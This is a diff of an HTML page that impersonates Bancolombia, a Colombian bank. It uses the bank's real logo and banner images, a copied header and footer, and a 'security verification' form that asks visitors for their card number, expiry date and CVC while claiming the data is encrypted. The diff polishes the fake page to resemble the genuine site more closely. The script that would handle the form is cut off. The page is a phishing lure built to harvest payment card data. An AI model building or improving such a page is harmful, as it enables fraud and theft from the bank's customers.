@@ -12,77 +12,230 @@
             --bancolombia-yellow: #FFC107;
             --bancolombia-light-blue: #E8F4FD;
             --bancolombia-dark-blue: #003366;
+            --bancolombia-purple: #210049;
+            --bancolombia-pink: #d9006e;
         }
         
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Open Sans', sans-serif;
+        }
+
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
-            min-height: 100vh;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+
+        /* Header Bancolombia */
+        .header-bancolombia {
+            background-color: #ffffff;
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo-bancolombia img {
+            height: 40px;
+        }
+
+        .header-nav {
+            display: flex;
+            gap: 30px;
+        }
+
+        .header-nav a {
+            color: #210049;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: color 0.3s ease;
+        }
+
+        .header-nav a:hover {
+            color: #d9006e;
+        }
+
+        .header-buttons {
+            display: flex;
+            gap: 15px;
+        }
+
+        .btn-sucursal {
+            background-color: #210049;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.9rem;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-sucursal:hover {
+            background-color: #3a1a6b;
+        }
+
+        /* Banner Principal */
+        .banner-container {
+            background-color: #FFFFFF;
+            padding: 80px 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .banner-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        .banner-text {
+            padding: 20px;
+        }
+
+        .banner-text h1 {
+            font-size: 2.5rem;
+            color: #210049;
+            margin-bottom: 20px;
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        .banner-text p {
+            font-size: 1.1rem;
             color: #333;
+            margin-bottom: 30px;
+            line-height: 1.6;
         }
-        
-        .logo-container {
+
+        .banner-button {
+            display: inline-block;
+            background-color: #FDDA24;
+            color: #210049;
+            padding: 16px 35px;
+            border-radius: 60px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(253, 218, 36, 0.3);
+        }
+
+        .banner-button:hover {
+            background-color: #F5C400;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(253, 218, 36, 0.4);
+        }
+
+        .banner-image {
             text-align: center;
-            padding: 30px 0 20px;
-            background-color: white;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
         }
-        
-        .bancolombia-logo {
-            height: 50px;
+
+        .banner-image img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 12px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
         }
-        
-        .security-container {
-            max-width: 500px;
-            margin: 30px auto;
-            background-color: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+
+        /* Formulario de Verificación */
+        .verification-section {
+            background-color: #F8F9FA;
+            padding: 80px 20px;
+        }
+
+        .verification-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .verification-title {
+            font-size: 2.2rem;
+            color: #210049;
+            margin-bottom: 20px;
+            font-weight: 700;
+            text-align: center;
+        }
+
+        .verification-subtitle {
+            font-size: 1.1rem;
+            color: #666;
+            margin-bottom: 50px;
+            text-align: center;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .verification-card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
             overflow: hidden;
+            max-width: 600px;
+            margin: 0 auto;
         }
-        
-        .security-header {
+
+        .verification-header {
             background: linear-gradient(135deg, var(--bancolombia-blue) 0%, var(--bancolombia-dark-blue) 100%);
             color: white;
             padding: 25px;
             text-align: center;
         }
-        
-        .security-body {
+
+        .verification-body {
             padding: 35px;
         }
-        
+
         .form-label {
             font-weight: 600;
             color: var(--bancolombia-blue);
             margin-bottom: 8px;
         }
-        
+
         .form-control {
             border-radius: 8px;
             padding: 14px 15px;
             border: 1.5px solid #e0e0e0;
             transition: all 0.3s;
-            font-size: 16px; /* Mejor para móviles */
+            font-size: 16px;
         }
-        
+
         .form-control:focus {
             border-color: var(--bancolombia-blue);
             box-shadow: 0 0 0 0.2rem rgba(0, 72, 132, 0.15);
         }
-        
+
         .card-input-container {
             position: relative;
         }
-        
-        .input-emoji {
+
+        .input-icon {
             position: absolute;
             right: 15px;
             top: 50%;
             transform: translateY(-50%);
-            font-size: 20px;
+            color: #6c757d;
         }
-        
+
         .btn-bancolombia {
             background: linear-gradient(135deg, var(--bancolombia-yellow) 0%, #FFD54F 100%);
             color: #000;
@@ -95,13 +248,13 @@
             font-size: 16px;
             box-shadow: 0 4px 6px rgba(255, 193, 7, 0.2);
         }
-        
+
         .btn-bancolombia:hover {
             background: linear-gradient(135deg, #FFD54F 0%, var(--bancolombia-yellow) 100%);
             transform: translateY(-2px);
             box-shadow: 0 6px 8px rgba(255, 193, 7, 0.3);
         }
-        
+
         .security-info {
             background-color: var(--bancolombia-light-blue);
             border-left: 4px solid var(--bancolombia-blue);
@@ -110,31 +263,20 @@
             border-radius: 0 8px 8px 0;
             font-size: 0.95rem;
         }
-        
-        .input-group {
-            margin-bottom: 25px;
-        }
-        
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            color: #6c757d;
-            font-size: 0.85rem;
-        }
-        
+
         .error-message {
             color: #dc3545;
             font-size: 0.875rem;
             margin-top: 6px;
             display: none;
         }
-        
+
         .loading {
             display: none;
             text-align: center;
             margin-top: 15px;
         }
-        
+
         .success-message {
             display: none;
             text-align: center;
@@ -142,12 +284,12 @@
             margin-top: 15px;
             font-weight: 600;
         }
-        
+
         .spinner-border {
             width: 1.5rem;
             height: 1.5rem;
         }
-        
+
         .card-preview {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             border-radius: 10px;
@@ -156,7 +298,7 @@
             margin-bottom: 25px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.1);
         }
-        
+
         .card-chip {
             width: 40px;
             height: 30px;
@@ -164,125 +306,324 @@
             border-radius: 5px;
             margin-bottom: 15px;
         }
-        
+
         .card-number-preview {
             font-family: 'Courier New', monospace;
             font-size: 1.2rem;
             letter-spacing: 2px;
             margin: 15px 0;
         }
-        
+
         .card-details {
             display: flex;
             justify-content: space-between;
             font-size: 0.9rem;
         }
+
+        /* Footer */
+        .footer {
+            background-color: #210049;
+            color: white;
+            padding: 50px 20px 30px;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 40px;
+        }
+
+        .footer-section h4 {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .footer-section ul {
+            list-style: none;
+        }
+
+        .footer-section ul li {
+            margin-bottom: 10px;
+        }
+
+        .footer-section a {
+            color: #ccc;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .footer-section a:hover {
+            color: #FDDA24;
+        }
+
+        .footer-bottom {
+            max-width: 1200px;
+            margin: 40px auto 0;
+            padding-top: 30px;
+            border-top: 1px solid #333;
+            text-align: center;
+            color: #ccc;
+            font-size: 0.9rem;
+        }
+
+        .footer-logo {
+            margin-bottom: 20px;
+        }
+
+        .footer-logo img {
+            height: 40px;
+            filter: brightness(0) invert(1);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header-container {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .header-nav {
+                gap: 20px;
+                flex-wrap: wrap;
+                justify-content: center;
+            }
+
+            .banner-content {
+                grid-template-columns: 1fr;
+                text-align: center;
+                gap: 40px;
+            }
+            
+            .banner-text h1 {
+                font-size: 2rem;
+            }
+            
+            .verification-title {
+                font-size: 1.8rem;
+            }
+            
+            .footer-container {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .banner-container {
+                padding: 40px 15px;
+            }
+            
+            .banner-text h1 {
+                font-size: 1.8rem;
+            }
+            
+            .verification-section {
+                padding: 50px 15px;
+            }
+            
+            .verification-body {
+                padding: 25px 20px;
+            }
+
+            .header-nav {
+                gap: 15px;
+            }
+
+            .header-nav a {
+                font-size: 0.8rem;
+            }
+        }
     </style>
 </head>
 <body>
-    <!-- Logo Bancolombia -->
-    <div class="logo-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/40/Bancolombia_logo.svg/2560px-Bancolombia_logo.svg.png" alt="Bancolombia" class="bancolombia-logo">
-    </div>
-
-    <!-- Contenedor del formulario -->
-    <div class="container">
-        <div class="security-container">
-            <div class="security-header">
-                <h3>🔒 Verificación de Seguridad</h3>
-                <p class="mb-0">Complete la información requerida para continuar</p>
+    <!-- Header Bancolombia -->
+    <header class="header-bancolombia">
+        <div class="header-container">
+            <div class="logo-bancolombia">
+                <img src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES" alt="Bancolombia">
             </div>
+            <nav class="header-nav">
+                <a href="#">Personas</a>
+                <a href="#">Empresas</a>
+                <a href="#">Sucursal Virtual</a>
+                <a href="#">Ayuda</a>
+            </nav>
+            <div class="header-buttons">
+                <a href="#" class="btn-sucursal">Sucursal Virtual</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Banner Principal -->
+    <section class="banner-container">
+        <div class="banner-content">
+            <div class="banner-text">
+                <h1>Verificación de Seguridad</h1>
+                <p>Para continuar con tu proceso, necesitamos verificar algunos datos de seguridad. Completa la información solicitada a continuación.</p>
+                <a href="#verification" class="banner-button">Continuar Verificación</a>
+            </div>
+            <div class="banner-image">
+                <img src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/e32cb424-b42f-4a24-9cd1-80e0d44a135a/banner-web-clave-dinamica.jpg?MOD=AJPERES" alt="Verificación de Seguridad Bancolombia">
+            </div>
+        </div>
+    </section>
+
+    <!-- Formulario de Verificación -->
+    <section class="verification-section" id="verification">
+        <div class="verification-container">
+            <h2 class="verification-title">Verificación de Seguridad</h2>
+            <p class="verification-subtitle">Para proteger tu cuenta, necesitamos verificar algunos datos de tu tarjeta. Esta información es confidencial y segura.</p>
             
-            <div class="security-body">
-                <div class="card-preview">
-                    <div class="card-chip"></div>
-                    <div class="card-number-preview" id="cardPreview">**** **** **** ****</div>
-                    <div class="card-details">
-                        <div>
-                            <div style="font-size: 0.7rem; opacity: 0.8;">TITULAR</div>
-                            <div>•••• ••••</div>
-                        </div>
-                        <div>
-                            <div style="font-size: 0.7rem; opacity: 0.8;">EXPIRA</div>
-                            <div>••/••</div>
-                        </div>
-                    </div>
+            <div class="verification-card">
+                <div class="verification-header">
+                    <h3>Verificación de Tarjeta</h3>
+                    <p class="mb-0">Complete la información requerida para continuar</p>
                 </div>
                 
-                <div class="security-info">
-                    <span>📋</span> Esta información es necesaria para validar su identidad y proteger su cuenta.
-                </div>
-                
-                <form id="securityForm">
-                    <div class="mb-4">
-                        <label for="cardNumber" class="form-label">💳 Número de Tarjeta</label>
-                        <div class="card-input-container">
-                            <input type="text" 
-                                   class="form-control" 
-                                   id="cardNumber" 
-                                   placeholder="1234 5678 9012 3456"
-                                   maxlength="19"
-                                   required>
-                            <span class="input-emoji">🔢</span>
+                <div class="verification-body">
+                    <div class="card-preview">
+                        <div class="card-chip"></div>
+                        <div class="card-number-preview" id="cardPreview">**** **** **** ****</div>
+                        <div class="card-details">
+                            <div>
+                                <div style="font-size: 0.7rem; opacity: 0.8;">TITULAR</div>
+                                <div>•••• ••••</div>
+                            </div>
+                            <div>
+                                <div style="font-size: 0.7rem; opacity: 0.8;">EXPIRA</div>
+                                <div>••/••</div>
+                            </div>
                         </div>
-                        <div class="error-message" id="cardNumberError">Por favor ingrese un número de tarjeta válido (16 dígitos)</div>
                     </div>
                     
-                    <div class="row">
-                        <div class="col-md-6 mb-4">
-                            <label for="expiryDate" class="form-label">📅 Fecha de Expiración</label>
+                    <div class="security-info">
+                        <i class="fas fa-info-circle me-2"></i> Esta información es necesaria para validar su identidad y proteger su cuenta.
+                    </div>
+                    
+                    <form id="securityForm">
+                        <div class="mb-4">
+                            <label for="cardNumber" class="form-label">Número de Tarjeta</label>
                             <div class="card-input-container">
                                 <input type="text" 
                                        class="form-control" 
-                                       id="expiryDate" 
-                                       placeholder="MM/AA"
-                                       maxlength="5"
+                                       id="cardNumber" 
+                                       placeholder="1234 5678 9012 3456"
+                                       maxlength="19"
                                        required>
-                                <span class="input-emoji">🗓️</span>
+                                <i class="fas fa-credit-card input-icon"></i>
                             </div>
-                            <div class="error-message" id="expiryDateError">Por favor ingrese una fecha válida (MM/AA)</div>
+                            <div class="error-message" id="cardNumberError">Por favor ingrese un número de tarjeta válido (16 dígitos)</div>
                         </div>
                         
-                        <div class="col-md-6 mb-4">
-                            <label for="cvc" class="form-label">🔐 Código de Seguridad (CVC)</label>
-                            <div class="card-input-container">
-                                <input type="text" 
-                                       class="form-control" 
-                                       id="cvc" 
-                                       placeholder="123"
-                                       maxlength="3"
-                                       required>
-                                <span class="input-emoji">🛡️</span>
+                        <div class="row">
+                            <div class="col-md-6 mb-4">
+                                <label for="expiryDate" class="form-label">Fecha de Expiración</label>
+                                <div class="card-input-container">
+                                    <input type="text" 
+                                           class="form-control" 
+                                           id="expiryDate" 
+                                           placeholder="MM/AA"
+                                           maxlength="5"
+                                           required>
+                                    <i class="fas fa-calendar-alt input-icon"></i>
+                                </div>
+                                <div class="error-message" id="expiryDateError">Por favor ingrese una fecha válida (MM/AA)</div>
                             </div>
-                            <div class="error-message" id="cvcError">Por favor ingrese un CVC válido (3 dígitos)</div>
+                            
+                            <div class="col-md-6 mb-4">
+                                <label for="cvc" class="form-label">Código de Seguridad (CVC)</label>
+                                <div class="card-input-container">
+                                    <input type="text" 
+                                           class="form-control" 
+                                           id="cvc" 
+                                           placeholder="123"
+                                           maxlength="3"
+                                           required>
+                                    <i class="fas fa-lock input-icon"></i>
+                                </div>
+                                <div class="error-message" id="cvcError">Por favor ingrese un CVC válido (3 dígitos)</div>
+                            </div>
                         </div>
-                    </div>
-                    
-                    <button type="submit" class="btn btn-bancolombia">
-                        ✅ Verificar y Continuar
-                    </button>
-                    
-                    <div class="loading" id="loading">
-                        <div class="spinner-border text-primary" role="status">
-                            <span class="visually-hidden">Procesando...</span>
+                        
+                        <button type="submit" class="btn btn-bancolombia">
+                            Verificar y Continuar
+                        </button>
+                        
+                        <div class="loading" id="loading">
+                            <div class="spinner-border text-primary" role="status">
+                                <span class="visually-hidden">Procesando...</span>
+                            </div>
+                            <p class="mt-2">Verificando información...</p>
                         </div>
-                        <p class="mt-2">Verificando información...</p>
-                    </div>
+                        
+                        <div class="success-message" id="successMessage">
+                            <p>Verificación exitosa. Redirigiendo...</p>
+                        </div>
+                    </form>
                     
-                    <div class="success-message" id="successMessage">
-                        <p>✅ Verificación exitosa. Redirigiendo...</p>
+                    <div class="footer mt-4">
+                        <p class="text-center" style="color: #6c757d; font-size: 0.85rem;">
+                            <i class="fas fa-lock me-1"></i> Sus datos están protegidos con encriptación de alta seguridad
+                        </p>
                     </div>
-                </form>
-                
-                <div class="footer">
-                    <p>🛡️ Sus datos están protegidos con encriptación de alta seguridad</p>
                 </div>
             </div>
         </div>
-    </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-section">
+                <div class="footer-logo">
+                    <img src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES" alt="Bancolombia">
+                </div>
+                <p>Tu seguridad es nuestra prioridad. Bancolombia contigo en cada paso.</p>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Te puede interesar</h4>
+                <ul>
+                    <li><a href="#">Centro de Ayuda</a></li>
+                    <li><a href="#">Puntos de Atención</a></li>
+                    <li><a href="#">App Mi Bancolombia</a></li>
+                    <li><a href="#">Seguridad Digital</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Legales</h4>
+                <ul>
+                    <li><a href="#">Términos y Condiciones</a></li>
+                    <li><a href="#">Protección de Datos</a></li>
+                    <li><a href="#">Transparencia</a></li>
+                    <li><a href="#">Atención al Consumidor</a></li>
+                </ul>
+            </div>
+            
+            <div class="footer-section">
+                <h4>Contáctanos</h4>
+                <ul>
+                    <li>Línea gratuita: 01 8000 9 12345</li>
+                    <li>Bogotá: (601) 343 0000</li>
+                    <li>Medellín: (604) 510 9000</li>
+                    <li><a href="#">Chat en Línea</a></li>
+                </ul>
+            </div>
+        </div>
+        
+        <div class="footer-bottom">
+            <p>&copy; 2024 Bancolombia S.A. Establecimiento Bancario - Todos los derechos reservados</p>
+        </div>
+    </footer>
 
     <!-- Bootstrap JS -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Font Awesome -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
     
     <script>
         document.addEventListener('DOMContentLoaded', function() {
